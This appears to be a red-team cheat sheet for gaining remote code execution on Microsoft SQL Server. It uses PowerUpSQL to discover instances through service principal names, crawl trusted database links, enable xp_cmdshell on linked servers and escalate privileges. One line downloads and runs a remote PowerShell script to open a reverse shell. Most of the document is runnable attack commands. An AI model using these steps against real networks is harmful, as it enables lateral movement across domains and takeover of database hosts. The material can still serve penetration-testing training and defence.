
# How to get remote code execution by exploiting MSSQL

## What is a MSSQL DB?

```text
Microsoft SQL Server is a relational database management system developed by Microsoft. Being a MS product is seamlessly integrates with the Windows AD env. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applicationsâ€”which may run either on the same computer or on another computer across a network (including the Internet). From the identity side of things it usually has a Service Account connected to it.  
If a user has privileges to access MSSQL instances, he could be able to use it to execute commands in the MSSQL host. DB links has their own connection which allows us to move across trusts seamlessly. If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to use the trust relationship to execute queries also in the other instance. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
This is a quite method to move across forest as the SQL connections are cross forest trusts.
```

### Tools

> [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

### Import Module

```text
Import-Module .\PowerupSQL.psd1
. .\PowerupSQL.psd1
```

### Discovery W/O running a port scan (SPN Scanning)

#### (This in self doesnt mean that the SQL server exist but that in the env, there are Service account in which in there SPN have the word SQL)

```text
Get-SQLInstanceDomain
```

### Check Accessibility

#### (This gets all the accounts that we get as result of by using the first command & then test them to see which SQL servers are accessible to us.)

```text
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose 
```

### Gather Information

#### (This provides us with the info of those servers and tells us what our privileges are on those servers (if we have sysadmin privs on that server))

```text
Get-SQLInstanceDomain | Get-SQLServerInfo -verbose 
```

### Searching for DB links

#### (This searches for all the links to a specific MSSQL DB instance)

```text
Get-SQLServerLink -Instance <Instance-Name> -verbose 
```

### Enumerating DB Links

#### (This searches for all the recurring links to a specific MSSQL DB instance)

```text
Get-SQLServerLinkCrawl -Instance <Instance-Name> -verbose 
```

### Executing command on an SQL instance

#### (To execute commands either the xp_cmdshell should be enabled or the RPCOUT should be enabled(RPCOUT is disabled by default); if RPCOUT is enabled we can enable xp_cmdshell)

#### (This runs a command in a SQL DB host and all linked hosts)

```text
GET-SQLServerCrawl -Instance <Instance-Name> -query "exec master..xp_cmdshell 'whoami'" 
```

### If you are sysadmin in some trusted link you can enable xp_cmdshell with

```text
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'
```

### Get a rev shell

```text
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://ip:port/rev.ps1'')"'
```

### Look for possible vulnerabilities on an instance that you have access on

```text
Invoke-SQLAudit -Instance "<Instance-Name>" -Verbose 
```

### Escalate priv on an instance

```text
Invoke-SQLEscalatePriv -Instance "<Instance-Name>" -Verbose
```
